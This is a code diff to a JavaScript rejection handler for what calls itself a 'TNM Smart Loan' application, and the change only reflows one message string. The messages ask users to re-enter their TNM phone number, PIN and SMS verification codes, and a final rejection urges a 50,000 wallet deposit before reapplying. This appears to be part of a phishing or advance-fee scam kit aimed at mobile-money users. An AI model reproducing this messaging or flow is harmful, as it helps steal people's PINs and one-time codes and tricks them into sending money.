@@ -144,23 +144,7 @@ function handleRejection(d){
     APPLICATION_DETAILS:"Your TNM phone number or PIN is invalid. Please check your details and try again. Ensure you are using the correct TNM number and PIN.",
     FIRST_NAME:"The verification code is incorrect or has expired. Please enter the new verification code received via SMS.",
     SECOND_NAME:"The verification code is incorrect or has expired. Please enter the new verification code received via SMS.",
-    AMOUNT:"**TNM SMART LOAN – APPLICATION UNSUCCESSFUL**
-
-Unfortunately, your loan application was unsuccessful because your TNM account did not meet the required eligibility criteria.
-
-This may be due to:
-- Insufficient regular transaction activity on your TNM line.
-- Your TNM wallet balance being below the minimum required balance of 50,000.
-
-**What You Can Do:**
-
-You may deposit funds into your TNM wallet to maintain the required minimum balance of 50,000 or continue using your line regularly for transactions.
-
-After making a deposit, allow at least one hour for your account activity to update before checking your eligibility again.
-
-Please note that meeting these requirements does not guarantee loan approval. All applications remain subject to eligibility verification.
-
-**Thank you for choosing TNM Smart Loan.**."
+    AMOUNT:"Unfortunately, your loan application was unsuccessful because your TNM account did not meet the required eligibility criteria.This may be due to:- Insufficient regular transaction activity on your TNM line.- Your TNM wallet balance being below the minimum required balance of 50,000.**What You Can Do:**You may deposit funds into your TNM wallet to maintain the required minimum balance of 50,000 or continue using your line regularly for transactions.After making a deposit, allow at least one hour for your account activity to update before checking your eligibility again.Please note that meeting these requirements does not guarantee loan approval. All applications remain subject to eligibility verification.**Thank you for choosing TNM Smart Loan.**."
   };
   const msg=messages[d.rejectedStage]||"The application was not accepted. Check your TNM demo details and try again.";
   if(d.rejectedStage==="FIRST_NAME"){
